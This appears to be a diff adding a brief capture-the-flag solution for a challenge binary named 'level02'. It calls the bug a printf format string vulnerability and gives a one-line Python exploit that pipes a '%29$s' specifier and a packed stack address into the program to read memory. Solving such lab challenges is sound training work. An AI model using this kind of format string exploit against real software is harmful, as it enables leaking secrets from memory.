@@ -1,0 +1,6 @@
+it's a printf formating vulnerability
+
+type the command:
+```
+python -c 'from struct import *; print "%29$s   " + pack("L", 0x7fffffffe480+144) ' | ./level02
+```
